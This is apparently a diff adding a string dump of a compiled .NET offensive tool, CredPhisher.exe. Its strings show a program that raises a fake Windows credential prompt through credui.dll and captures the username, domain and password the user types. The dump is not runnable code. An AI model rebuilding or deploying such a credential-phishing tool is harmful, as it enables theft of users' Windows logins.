@@ -1,0 +1,115 @@
+!This program cannot be run in DOS mode.
+.text
+`.rsrc
+@.reloc
+BSJB
+v4.0.30319
+#Strings
+#GUID
+#Blob
+<Module>
+CREDUI_INFO
+mscorlib
+get_Password
+set_Password
+pcchMaxPassword
+pszPassword
+CoTaskMemFree
+authPackage
+message
+Console
+get_Name
+pszDomainName
+get_UserName
+set_UserName
+pcchMaxUserName
+pszUserName
+pcchMaxDomainame
+WriteLine
+ValueType
+notUsedHere
+DebuggableAttribute
+AssemblyTitleAttribute
+AssemblyTrademarkAttribute
+TargetFrameworkAttribute
+AssemblyConfigurationAttribute
+AssemblyDescriptionAttribute
+CompilationRelaxationsAttribute
+AssemblyProductAttribute
+AssemblyCopyrightAttribute
+AssemblyCompanyAttribute
+RuntimeCompatibilityAttribute
+fSave
+CredPhisher.exe
+cbSize
+InAuthBufferSize
+refOutAuthBufferSize
+SizeOf
+System.Runtime.Versioning
+ToString
+Marshal
+NetworkCredential
+networkCredential
+System.Security.Principal
+ole32.dll
+credui.dll
+System
+Main
+get_Domain
+set_Domain
+System.Reflection
+NullReferenceException
+Zero
+StringBuilder
+cbAuthBuffer
+InAuthBuffer
+pAuthBuffer
+refOutAuthBuffer
+CredUnPackAuthenticationBuffer
+CredPhisher
+hbmBanner
+authError
+.ctor
+Collector
+IntPtr
+System.Diagnostics
+System.Runtime.InteropServices
+System.Runtime.CompilerServices
+DebuggingModes
+dwFlags
+flags
+args
+CredUIPromptForWindowsCredentials
+System.Security.Claims
+MainClass
+Concat
+Object
+System.Net
+hwndParent
+GetCurrent
+System.Text
+pszMessageText
+pszCaptionText
+ClaimsIdentity
+WindowsIdentity
+WrapNonExceptionThrows
+CredPhisher
+${AuthorCopyright}
+.NETFramework,Version=v4.8
+FrameworkDisplayName
+.NET Framework 4.8
+RSDS
+E:\Applications\Apps_VM_Sandbox_Windows\__SORT&BUILD\OffensiveCSharp\CredPhisher\obj\anycpu\Debug\CredPhisher.pdb
+_CorExeMain
+mscoree.dll
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <assemblyIdentity version="1.0.0.0" name="MyApplication.app"/>
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v2">
+    <security>
+      <requestedPrivileges xmlns="urn:schemas-microsoft-com:asm.v3">
+        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
